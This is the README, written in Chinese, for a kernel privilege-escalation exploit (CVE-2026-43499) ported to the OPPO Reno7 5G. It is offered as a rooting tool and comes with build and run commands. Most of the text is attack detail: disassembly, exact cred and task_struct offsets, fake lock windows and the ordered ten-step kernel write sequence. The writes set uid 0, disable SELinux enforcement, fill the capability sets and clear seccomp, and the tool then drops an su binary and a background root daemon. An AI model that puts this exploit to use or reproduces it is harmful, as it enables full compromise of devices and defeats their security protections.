# GhostLock54 for OPPO Reno7 5G

针对 OPPO Reno7 5G（型号 `OP5227`）的 GhostLock（CVE-2026-43499）移植版。

目标内核：`5.4.254-qgki-gaa96eae94d32`，Android 12。

本程序通过 futex PI 越界写获得内核任意写原语，改写目标进程的 `cred` 与 `task_struct` 字段，达到：

- 真实 `uid=0` / `gid=0`
- SELinux 切到 `Permissive`
- 为子进程的 `cred` 写入 capability 集合（`cap_effective` / `cap_permitted` / `cap_bset` / `cap_inheritable` / `cap_ambient` 全部置满）
- 清 `securebits`，避免 `execve` 时被 `SECURE_NOROOT` 清空 cap
- 清目标任务的 `task_struct.seccomp`，让子进程 fork 后不再被 Android seccomp filter 拦截 `finit_module` 等敏感系统调用（`Seccomp: 0`）
- **自动释放内置的 `su` 客户端到 `/data/local/tmp/su`**
- **自动在后台拉起 `rootd` 守护进程，提供纯净的 Root 服务**

> **重要提示**：由于漏洞利用后必须保持主进程存活以防内核悬挂指针引发崩溃（Kernel Panic），程序执行完毕后不会退出终端。**请保持该终端窗口不关闭，直接新开一个终端窗口使用 `/data/local/tmp/su` 获取 Root 权限。**

## 编译

项目已经合并为单文件，`su` 客户端二进制会自动打包进 `ghostlock54` 可执行文件中。使用 Termux 自带的 clang 编译，不需要 NDK：

```sh
clang -O3 -march=armv8.2-a+crc -pthread ghostlock54.c -o ghostlock54
```

或者直接使用自带的 Makefile 一键编译（自动打包 su）：

```sh
make clean
make
```

运行

编译完成后，将唯一的可执行文件推送到设备并赋予执行权限：

```sh
adb push ghostlock54 /data/local/tmp/ghostlock54
adb shell chmod 755 /data/local/tmp/ghostlock54
```

1. 正常模式（推荐）

```sh
adb shell -t /data/local/tmp/ghostlock54
```

(如果终端卡住无法返回提示符，这是正常现象，请保持窗口开启。)

程序会完成提权，释放 su 到 /data/local/tmp/su，并在后台静默启动 rootd 守护进程。

2. 应急模式（直连 Root Shell）

如果你的白名单损坏，或者 rootd 意外无法启动，可以使用应急模式直接在当前终端弹出一个无视任何限制的 Root Shell：

```sh
adb shell -t /data/local/tmp/ghostlock54 --emergency
```

进入 # 后，输入 exit 即可退出该应急 shell（但后台的漏洞保活进程依然会存活）。

获取 Root 权限

在另一个终端窗口（或保持漏洞程序窗口不关，另开一个新窗口）中执行：

```sh
adb shell
/data/local/tmp/su
```

成功进入 root shell，getenforce 输出 Permissive，/proc/self/status 示例：

```
Uid:    0       0       0       0
CapInh: ffffffd11e5affff
CapPrm: ffffffd11e5affff
CapEff: ffffffd11e5affff
CapBnd: ffffffd11e5affff
CapAmb: ffffffd11e5affff
Seccomp:        0
```

上表是示例。低 16 位 0xffff 稳定有效（由 k_write_value | 0xffff 决定）；bit 16..40 来自 k_write_value 的 KASLR 高位，每次重启随机，高位不保证含任何具体 cap。

稳定可用的 cap（低 16 位，bit 0..15）：

CAP_CHOWN、CAP_DAC_OVERRIDE、CAP_DAC_READ_SEARCH、CAP_FOWNER、CAP_FSETID、CAP_KILL、CAP_SETGID、CAP_SETUID、CAP_SETPCAP、CAP_LINUX_IMMUTABLE、CAP_NET_BIND_SERVICE、CAP_NET_BROADCAST、CAP_NET_ADMIN、CAP_NET_RAW、CAP_IPC_LOCK、CAP_IPC_OWNER。

高位不保证含 CAP_SYS_ADMIN(21) 等，需要时只能靠重启抽到含该位的 k_write_value，不要依赖。

已验证可读 /data、/data/system/users/0.xml。

实现要点

越界写必须选可写地址

反汇编 rb_erase 可见写入路径末尾会 dereference 被写值：

```
ffffffc011705d58:  str x9, [x8, #8]     ; *(target) = value
ffffffc011705d5c:  cbz x9, #0xffffffc011705e04
ffffffc011705d60:  str x10, [x9]        ; *(value) = x10   <-- 会解引用
```

因此 value 必须是可读写内核地址。这里用 k_write_value = (__log_buf 上界 + 0xffff) & ~0xffff 作为底，再或上 0xffff 掩码，得到 cap 位图低 16 位全 1，且 deref 落在 __log_buf 同一 64 KiB 页内，安全。

cred / task 字段偏移

cred 字段由 cap_capable 反汇编交叉验证；task_struct.seccomp 由 __secure_computing 的 mrs x8, sp_el0; ldr w9, [x8, #0x8d0] 反汇编得到。

字段 偏移
cred->uid / cred->gid +0x04 / +0x08
cred->euid / cred->egid +0x14 / +0x18
cred->securebits +0x24
cred->cap_inheritable +0x28
cred->cap_permitted +0x30
cred->cap_effective +0x38
cred->cap_bset +0x40
cred->cap_ambient +0x48
cred->user_ns +0x88
task->real_cred +0x800
task->cred +0x808
task->seccomp +0x8d0

fake lock 窗口

write_value() 每次消耗一个 fake lock 窗口，windows[] 共 10 个：

```
0xa80, 0xb00, 0xb80, 0xc00, 0xc80,
0xd00, 0xd80, 0xe00, 0xe80,
0xf00
```

10 次写恰好用满。第 11 次会 pr_error("Out of fake lock windows!") 直接退出。要加写操作必须同时扩 windows[]，并确认新偏移仍在 selinux_state 那一页内、不越过 empty_zero_page（0x1000）。

写入顺序

rb_erase 也会读 *(target - 8) 作为 parent。写 cap 时必须按 +0x38 → +0x30 → +0x40 → +0x28 → +0x48 的顺序，确保每次读取的 parent 位置都还没被本次改写污染，否则会 deref 到刚写入的 cap 值直接 panic。

当前完整顺序（10 次写）：

1. selinux_state ← k_write_value（切 Permissive）
2. cred+0x04 ← 0（uid / gid）
3. cred+0x14 ← 0（euid / egid）
4. cred+0x24 ← 0（securebits）
5. cred+0x38 ← capval（cap_effective）
6. cred+0x30 ← capval（cap_permitted）
7. cred+0x40 ← capval（cap_bset）
8. cred+0x28 ← capval（cap_inheritable）
9. cred+0x48 ← capval（cap_ambient）
10. task+0x8d0 ← 0（seccomp mode 清零）

安全说明

· 仅针对上述设备/内核标定。换内核必须重新反汇编验证所有偏移和栈几何，否则极易 panic。
· 主进程保活机制：成功利用后，内核 PI 引用指向存活的工作线程内核栈。为了防止主进程退出导致 Y 线程栈释放而触发 Kernel Panic，主进程会进入 for(;;) pause(); 死循环。这是正常现象，请无视终端的卡死状态。
· 不要试图 kill -9 挂起的漏洞主进程，否则悬挂的 fake waiter 被别的进程取到会瞬间 Panic。
· 恢复系统到正常状态只能靠重启（adb reboot）。
· 仅在你自己拥有或明确授权测试的设备上使用。

许可证

Apache License 2.0
